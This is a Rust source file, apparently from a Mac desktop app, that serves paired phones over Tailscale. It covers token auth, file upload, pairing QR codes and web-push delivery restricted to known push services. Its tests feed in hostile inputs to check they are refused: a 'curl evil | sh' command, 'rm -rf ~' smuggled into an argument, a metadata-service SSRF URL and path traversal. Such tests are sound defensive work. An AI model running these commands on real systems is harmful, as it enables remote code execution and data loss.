async fn api_messages(h: HeaderMap, Query(q): Query<MessagesQ>) -> ApiResult {
    auth(&h)?;
    let m = blocking(move || crate::phone::conversation_since(&q.session, &q.cwd, q.len)).await?;
    Ok(Json(m).into_response())
}

/// The newest text copied on the Mac, so the phone can copy it too.
async fn api_clipboard(h: HeaderMap) -> ApiResult {
    auth(&h)?;
    let c = blocking(|| Ok(crate::phone::clipboard())).await?;
    Ok(Json(c).into_response())
}

#[derive(Deserialize)]
struct UploadQ {
    name: String,
}

/// A file to attach to a message, saved on the Mac; answers its path.
async fn api_upload(h: HeaderMap, Query(q): Query<UploadQ>, body: axum::body::Body) -> ApiResult {
    // The token is checked before the body is read.
    let device = auth(&h)?;
    let body = axum::body::to_bytes(body, crate::phone::UPLOAD_MAX + 1)
        .await
        .map_err(|_| (StatusCode::PAYLOAD_TOO_LARGE, "file too large".to_string()))?;
    let tag = format!("{}{}", &sha_hex(&device)[..6], B64.encode(random_bytes::<6>()).replace(['-', '_'], "x"));
    let path = blocking(move || crate::phone::save_upload(&q.name, &body, &tag)).await?;
    Ok(Json(serde_json::json!({ "path": path })).into_response())
}

#[derive(Deserialize)]
struct SubKeys {
    p256dh: String,
    auth: String,
}

#[derive(Deserialize)]
struct SubReq {
    endpoint: String,
    keys: SubKeys,
}

/// Push services of the browsers that can hold a home-screen web app; any
/// other endpoint would let a token holder make this Mac call arbitrary URLs.
/// Parsed the way the HTTP client will parse it (a `\\` counts as `/`).
fn push_endpoint(endpoint: &str) -> Option<reqwest::Url> {
    if endpoint.len() > 2048 || endpoint.contains('\\') || endpoint.chars().any(|c| c.is_control() || c.is_whitespace()) {
        return None;
    }
    let u = reqwest::Url::parse(endpoint).ok()?;
    let host = u.host_str()?.to_ascii_lowercase();
    let allowed = host == "web.push.apple.com"
        || host.ends_with(".push.apple.com")
        || host == "fcm.googleapis.com"
        || host == "updates.push.services.mozilla.com"
        || host.ends_with(".notify.windows.com");
    (u.scheme() == "https" && u.username().is_empty() && u.password().is_none() && u.port().is_none() && allowed).then_some(u)
}

fn push_endpoint_ok(endpoint: &str) -> bool {
    push_endpoint(endpoint).is_some()
}

async fn api_subscribe(h: HeaderMap, Json(r): Json<SubReq>) -> ApiResult {
    let id = auth(&h)?;
    let key_ok = |s: &str| !s.is_empty() && s.len() <= 200 && s.chars().all(|c| c.is_ascii_alphanumeric() || "-_=".contains(c));
    if !push_endpoint_ok(&r.endpoint) || !key_ok(&r.keys.p256dh) || !key_ok(&r.keys.auth) {
        return Err(bad("unsupported push subscription"));
    }
    with_cfg(|c| {
        // The same phone paired twice would get every notification twice.
        for d in c.devices.iter_mut() {
            if d.id != id && d.sub.as_ref().is_some_and(|s| s.endpoint == r.endpoint) {
                d.sub = None;
            }
        }
        if let Some(d) = c.devices.iter_mut().find(|d| d.id == id) {
            d.sub = Some(Sub { endpoint: r.endpoint, p256dh: r.keys.p256dh, auth: r.keys.auth });
        }
        save(c)
    })
    .map_err(|e| (StatusCode::INTERNAL_SERVER_ERROR, e))?;
    notify_desktop();
    Ok(StatusCode::NO_CONTENT.into_response())
}

async fn api_push_test(h: HeaderMap) -> ApiResult {
    let id = auth(&h)?;
    send_push(Some(id), "Toranj", "Notifications work on this phone.", "", "test").await.map_err(|e| (StatusCode::BAD_GATEWAY, e))?;
    Ok(StatusCode::NO_CONTENT.into_response())
}

/// Tells the desktop window to refresh its Mobile settings (a phone paired
/// or turned on notifications).
fn notify_desktop() {
    notify_desktop_with("changed");
}

fn notify_desktop_with(what: &str) {
    use tauri::Emitter;
    if let Some(app) = APP.get() {
        let _ = app.emit("mobile-changed", what);
    }
}

// ---------- push ----------

fn vapid_ok(k: &str) -> bool {
    crate::webpush::vapid_key(k).is_some()
}

fn ensure_vapid(c: &mut Config) -> Result<(), String> {
    if vapid_ok(&c.vapid) {
        return Ok(());
    }
    c.vapid = crate::webpush::new_vapid_key();
    save(c)
}

fn vapid_public(c: &Config) -> String {
    crate::webpush::vapid_key(&c.vapid)
        .map(|k| crate::webpush::vapid_public(&k))
        .unwrap_or_default()
}

/// Seconds since the last keyboard or mouse input on this Mac.
fn idle_secs() -> f64 {
    #[link(name = "CoreGraphics", kind = "framework")]
    unsafe extern "C" {
        fn CGEventSourceSecondsSinceLastEventType(state: i32, event_type: u32) -> f64;
    }
    // kCGEventSourceStateCombinedSessionState, kCGAnyInputEventType
    unsafe { CGEventSourceSecondsSinceLastEventType(0, u32::MAX) }
}

/// Sends a notification to one device (`only`) or every paired device with
/// notifications on. Subscriptions the push service no longer knows are dropped.
async fn send_push(only: Option<String>, title: &str, body: &str, tab: &str, kind: &str) -> Result<(), String> {
    let (key, targets) = with_cfg(|c| {
        let t: Vec<(String, Sub)> = c
            .devices
            .iter()
            .filter(|d| only.as_ref().is_none_or(|o| *o == d.id))
            .filter_map(|d| d.sub.clone().map(|s| (d.id.clone(), s)))
            .collect();
        (c.vapid.clone(), t)
    });
    if targets.is_empty() {
        return Err("This phone has not turned on notifications yet.".into());
    }
    let key = crate::webpush::vapid_key(&key).ok_or("no push key yet; turn phone access off and on")?;
    let payload = serde_json::to_vec(&serde_json::json!({ "title": title, "body": body, "tab": tab, "kind": kind })).map_err(|e| e.to_string())?;
    // No redirects: a push service never needs one, and following them
    // would let an endpoint point this Mac somewhere else.
    let client = reqwest::Client::builder()
        .redirect(reqwest::redirect::Policy::none())
        .timeout(Duration::from_secs(15))
        .build()
        .map_err(|e| e.to_string())?;
    let mut last_err = None;
    for (id, s) in targets {
        let Some(url) = push_endpoint(&s.endpoint) else { continue };
        let aud = format!("https://{}", url.host_str().unwrap_or_default());
        let res = async {
            let body = crate::webpush::encrypt(&payload, &s.p256dh, &s.auth)?;
            let auth = crate::webpush::vapid_header(&key, &aud, "https://github.com/hrvojecukman/toranj", now())?;
            client
                .post(url)
                .header("TTL", "3600")
                .header("Urgency", "high")
                .header("Content-Encoding", "aes128gcm")
                .header("Content-Type", "application/octet-stream")
                .header("Authorization", auth)
                .body(body)
                .send()
                .await
                .map_err(|e| format!("push service not reachable: {e}"))
        }
        .await;
        match res {
            Ok(r) if r.status().is_success() => {}
            Ok(r) if r.status().as_u16() == 404 || r.status().as_u16() == 410 => {
                with_cfg(|c| {
                    if let Some(d) = c.devices.iter_mut().find(|d| d.id == id) {
                        d.sub = None;
                    }
                    let _ = save(c);
                });
                notify_desktop();
                last_err = Some("The phone's notification subscription expired; turn notifications on again in the app.".to_string());
            }
            Ok(r) => {
                let code = r.status().as_u16();
                let text: String = r.text().await.unwrap_or_default().chars().filter(|c| !c.is_control()).take(200).collect();
                last_err = Some(format!("push service answered {code} {text}"));
            }
            Err(e) => last_err = Some(e),
        }
    }
    match last_err {
        Some(e) => Err(e),
        None => Ok(()),
    }
}

// ---------- commands for the desktop window ----------

#[derive(Serialize)]
pub struct DeviceView {
    id: String,
    name: String,
    created: u64,
    last_seen: u64,
    push: bool,
}

#[derive(Serialize)]
pub struct MobileStatus {
    enabled: bool,
    running: bool,
    port: u16,
    tailscale_installed: bool,
    tailscale_name: Option<String>,
    serving: bool,
    /// Funnel is on for our port: Toranj would be on the public internet.
    funnel: bool,
    url: Option<String>,
    devices: Vec<DeviceView>,
    push: PushPrefs,
}

fn status() -> MobileStatus {
    let (enabled, port, devices, push) = with_cfg(|c| {
        (
            c.enabled,
            c.port,
            c.devices
                .iter()
                .map(|d| DeviceView { id: d.id.clone(), name: d.name.clone(), created: d.created, last_seen: d.last_seen, push: d.sub.is_some() })
                .collect(),
            c.push.clone(),
        )
    });
    let name = ts_identity().map(|(n, _)| n);
    let (serving, funnel) = match &name {
        Some(n) if port != 0 => ts_serving(n, port),
        _ => (false, false),
    };
    MobileStatus {
        enabled,
        running: running(),
        port,
        tailscale_installed: ts_bin().is_some(),
        url: name.as_ref().filter(|_| serving).map(|n| format!("https://{n}:{TS_PORT}/")),
        tailscale_name: name,
        serving,
        funnel,
        devices,
        push,
    }
}

#[tauri::command]
pub async fn mobile_status() -> MobileStatus {
    tauri::async_runtime::spawn_blocking(status).await.unwrap_or_else(|_| status())
}

/// Turns phone access on (server + `tailscale serve`) or off. If starting
/// fails, phone access stays off.
#[tauri::command]
pub async fn mobile_set_enabled(on: bool) -> Result<MobileStatus, String> {
    tauri::async_runtime::spawn_blocking(move || {
        if on {
            with_cfg(ensure_vapid)?;
            let port = start()?;
            with_cfg(|c| {
                c.enabled = true;
                save(c)
            })?;
            sync_serve(port)?;
        } else {
            with_cfg(|c| {
                c.enabled = false;
                save(c)
            })?;
            stop();
            if ts_bin().is_some() {
                ts_serve_off();
            }
            *PAIR.lock().unwrap_or_else(|e| e.into_inner()) = None;
        }
        Ok(status())
    })
    .await
    .map_err(|e| e.to_string())?
}

#[derive(Serialize)]
pub struct PairInfo {
    code: String,
    url: String,
    qr_svg: String,
    expires_in: u64,
}

/// A fresh single-use pairing code (10 minutes) and a QR code of the app's URL.
#[tauri::command]
pub async fn mobile_pair() -> Result<PairInfo, String> {
    tauri::async_runtime::spawn_blocking(|| {
        let st = status();
        if !st.running {
            return Err("Turn on phone access first.".into());
        }
        if st.funnel {
            return Err("Tailscale Funnel is on for port 8443, which would put Toranj on the internet. Turn it off (tailscale funnel 8443 off) first.".into());
        }
        let url = st.url.clone().ok_or("Tailscale isn't publishing Toranj yet, so the phone can't reach it. See the note above.")?;
        // No 0/O/1/I: easy to read off a screen and type on a phone.
        const ABC: &[u8] = b"ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
        let code: String = random_bytes::<8>().iter().map(|b| ABC[(*b as usize) % ABC.len()] as char).collect();
        *PAIR.lock().unwrap_or_else(|e| e.into_inner()) = Some(Pairing { code: code.clone(), until: Instant::now() + PAIR_TTL, tries: 0 });
        // The code rides in the fragment, which browsers never send to a
        // server: scanning opens the app ready to pair, nothing to type.
        let qr = qrcode::QrCode::new(format!("{url}#pair={code}").as_bytes()).map_err(|e| e.to_string())?;
        let qr_svg = qr
            .render::<qrcode::render::svg::Color>()
            .min_dimensions(180, 180)
            .quiet_zone(true)
            .dark_color(qrcode::render::svg::Color("#000000"))
            .light_color(qrcode::render::svg::Color("#ffffff"))
            .build();
        Ok(PairInfo { code, url, qr_svg, expires_in: PAIR_TTL.as_secs() })
    })
    .await
    .map_err(|e| e.to_string())?
}

#[tauri::command]
pub fn mobile_revoke(id: String) -> Result<(), String> {
    with_cfg(|c| {
        c.devices.retain(|d| d.id != id);
        save(c)
    })
}

#[tauri::command]
pub fn mobile_set_push(prefs: PushPrefs) -> Result<(), String> {
    with_cfg(|c| {
        c.push = prefs;
        save(c)
    })
}

#[tauri::command]
pub async fn mobile_test_push(id: String) -> Result<(), String> {
    send_push(Some(id), "Toranj", "Notifications work on this phone.", "", "test").await
}

/// Called with every desktop notification; forwards it to paired phones
/// when that kind is on and (if asked) nobody is at the Mac.
#[tauri::command]
pub async fn mobile_push(tab: String, title: String, body: String, kind: String) -> Result<bool, String> {
    let (on, prefs, any) = with_cfg(|c| (c.enabled, c.push.clone(), c.devices.iter().any(|d| d.sub.is_some())));
    let wanted = match kind.as_str() {
        "done" => prefs.done,
        "waiting" => prefs.waiting,
        "error" => prefs.error,
        _ => false,
    };
    if !on || !any || !wanted || (prefs.only_away && idle_secs() < AWAY_SECS) {
        return Ok(false);
    }
    send_push(None, &title, &body, &tab, &kind).await.map(|_| true)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn only_known_push_services() {
        assert!(push_endpoint_ok("https://web.push.apple.com/QGx1"));
        assert!(push_endpoint_ok("https://fcm.googleapis.com/fcm/send/abc"));
        assert!(!push_endpoint_ok("http://web.push.apple.com/x"));
        assert!(!push_endpoint_ok("https://web.push.apple.com.evil.com/x"));
        assert!(!push_endpoint_ok("https://user@web.push.apple.com/x"));
        assert!(!push_endpoint_ok("https://127.0.0.1/x"));
    }

    async fn call(app: &Router, method: &str, path: &str, host: &str, token: &str, body: &str) -> (StatusCode, String) {
        call_with(app, method, path, host, token, body, &[]).await
    }

    async fn call_with(app: &Router, method: &str, path: &str, host: &str, token: &str, body: &str, extra: &[(&str, &str)]) -> (StatusCode, String) {
        use http_body_util::BodyExt;
        use tower::ServiceExt;
        let mut b = axum::http::Request::builder().method(method).uri(path).header("host", host).header("content-type", "application/json");
        for (k, v) in extra {
            b = b.header(*k, *v);
        }
        if !token.is_empty() {
            b = b.header("authorization", format!("Bearer {token}"));
        }
        let res = app.clone().oneshot(b.body(axum::body::Body::from(body.to_string())).unwrap()).await.unwrap();
        let status = res.status();
        let bytes = res.into_body().collect().await.unwrap().to_bytes();
        (status, String::from_utf8_lossy(&bytes).into_owned())
    }

    #[tokio::test]
    async fn pairs_once_and_needs_the_token() {
        with_cfg(|c| c.port = 4999);
        let host = "127.0.0.1:4999";
        let app = router();
        // Strangers get nothing, and other hosts are refused outright.
        assert_eq!(call(&app, "GET", "/api/me", host, "", "").await.0, StatusCode::UNAUTHORIZED);
        assert_eq!(call(&app, "GET", "/api/me", "evil.example:4999", "", "").await.0, StatusCode::MISDIRECTED_REQUEST);
        // No pairing started: refused.
        assert_eq!(call(&app, "POST", "/api/pair", host, "", r#"{"code":"AAAA2222","name":"x"}"#).await.0, StatusCode::FORBIDDEN);
        *PAIR.lock().unwrap() = Some(Pairing { code: "ABCD2345".into(), until: Instant::now() + PAIR_TTL, tries: 0 });
        assert_eq!(call(&app, "POST", "/api/pair", host, "", r#"{"code":"WRONG234","name":"x"}"#).await.0, StatusCode::FORBIDDEN);
        let (st, body) = call(&app, "POST", "/api/pair", host, "", r#"{"code":"abcd 2345","name":"Test phone"}"#).await;
        assert_eq!(st, StatusCode::OK, "{body}");
        let token = serde_json::from_str::<serde_json::Value>(&body).unwrap()["token"].as_str().unwrap().to_string();
        // Single use.
        assert_eq!(call(&app, "POST", "/api/pair", host, "", r#"{"code":"ABCD2345","name":"x"}"#).await.0, StatusCode::FORBIDDEN);
        let (st, me) = call(&app, "GET", "/api/me", host, &token, "").await;
        assert_eq!(st, StatusCode::OK);
        assert!(me.contains("Test phone"));
        assert_eq!(call(&app, "GET", "/api/me", host, &format!("{token}x"), "").await.0, StatusCode::UNAUTHORIZED);
        // Only real push services, and only known terminals.
        let bad_sub = r#"{"endpoint":"https://169.254.169.254/latest","keys":{"p256dh":"abc","auth":"def"}}"#;
        assert_eq!(call(&app, "POST", "/api/push/subscribe", host, &token, bad_sub).await.0, StatusCode::BAD_REQUEST);
        assert_eq!(call(&app, "GET", "/api/peek?name=..%2Fx", host, &token, "").await.0, StatusCode::BAD_REQUEST);
        // Through Tailscale: only the Mac owner's devices, never Funnel, never cross-site.
        with_cfg(|c| {
            c.ts_host = "mac.tail1.ts.net".into();
            c.ts_owner = "me@example.com".into();
        });
        let ts = "mac.tail1.ts.net:8443";
        assert_eq!(call(&app, "GET", "/api/me", ts, &token, "").await.0, StatusCode::FORBIDDEN);
        assert_eq!(call_with(&app, "GET", "/api/me", ts, &token, "", &[("tailscale-user-login", "other@example.com")]).await.0, StatusCode::FORBIDDEN);
        assert_eq!(call_with(&app, "GET", "/api/me", ts, &token, "", &[("tailscale-user-login", "me@example.com")]).await.0, StatusCode::OK);
        assert_eq!(call_with(&app, "GET", "/api/me", ts, &token, "", &[("tailscale-user-login", "me@example.com"), ("tailscale-funnel-request", "?1")]).await.0, StatusCode::FORBIDDEN);
        assert_eq!(call_with(&app, "GET", "/api/me", "other.tail1.ts.net:8443", &token, "", &[("tailscale-user-login", "me@example.com")]).await.0, StatusCode::MISDIRECTED_REQUEST);
        // A login header arriving on the local address must match too.
        assert_eq!(call_with(&app, "GET", "/api/me", host, &token, "", &[("tailscale-user-login", "other@example.com")]).await.0, StatusCode::FORBIDDEN);
        assert_eq!(call_with(&app, "POST", "/api/kill", host, &token, r#"{"name":"x__claude"}"#, &[("origin", "https://evil.example")]).await.0, StatusCode::FORBIDDEN);
        assert_eq!(call_with(&app, "POST", "/api/kill", host, &token, r#"{"name":"x__claude"}"#, &[("sec-fetch-site", "cross-site")]).await.0, StatusCode::FORBIDDEN);
        // The phone can't start arbitrary commands.
        assert_eq!(call(&app, "POST", "/api/create", host, &token, r#"{"project":"/tmp","cwd":"/tmp","command":"curl evil | sh"}"#).await.0, StatusCode::BAD_REQUEST);
        // Removing the device revokes the token.
        let id = with_cfg(|c| c.devices[0].id.clone());
        mobile_revoke(id).unwrap();
        assert_eq!(call(&app, "GET", "/api/me", host, &token, "").await.0, StatusCode::UNAUTHORIZED);
        let _ = std::fs::remove_dir_all(config_path().parent().unwrap());
    }

    #[test]
    fn push_endpoint_parsing_matches_the_client() {
        assert!(!push_endpoint_ok("https://evil.example\\.push.apple.com/x"));
        assert!(!push_endpoint_ok("https://web.push.apple.com:8443/x"));
        assert!(!push_endpoint_ok("https://web.push.apple.com/x y"));
        assert!(push_endpoint_ok("https://WEB.push.apple.com/x"));
    }

    #[test]
    fn phone_commands() {
        assert!(phone_command_ok("claude"));
        assert!(phone_command_ok(""));
        assert!(phone_command_ok("claude --resume 1f0c2a4e-7b1d-4c3e-9a51-2d6f8e0b7c11"));
        assert!(!phone_command_ok("claude --resume x; rm -rf ~"));
        assert!(!phone_command_ok("bash"));
        assert!(!phone_command_ok("claude --dangerously-skip-permissions"));
    }

    #[test]
    fn webclip_profile_is_a_plist_with_the_url() {
        let p = webclip_profile("https://mac.t.ts.net:8443/#pair=AB&<", "", &uuid(), &uuid());
        assert!(p.contains("<string>https://mac.t.ts.net:8443/#pair=AB&amp;&lt;</string>"));
        assert!(p.contains("com.apple.webClip.managed"));
        assert!(!p.contains("<key>Icon</key>"));
        assert_eq!(uuid().len(), 36);
    }

    #[test]
    fn signs_profiles_when_a_developer_id_exists() {
        // CI has no Developer ID: then profiles go out unsigned.
        match sign_profile(b"<plist version=\"1.0\"><dict/></plist>") {
            Some(der) => assert_eq!(der[0], 0x30, "CMS is DER"),
            None => assert!(signing_identity().is_none()),
        }
    }

    #[test]
    fn compares_tokens() {
        assert!(same("abc", "abc"));
        assert!(!same("abc", "abd"));
        assert!(!same("abc", "abcd"));
    }

    #[test]
    fn makes_a_vapid_key() {
        let c = Config { vapid: crate::webpush::new_vapid_key(), ..Default::default() };
        // Uncompressed P-256 point: 65 bytes.
        assert_eq!(B64.decode(vapid_public(&c)).unwrap().len(), 65);
        assert!(vapid_public(&Config::default()).is_empty());
    }
}
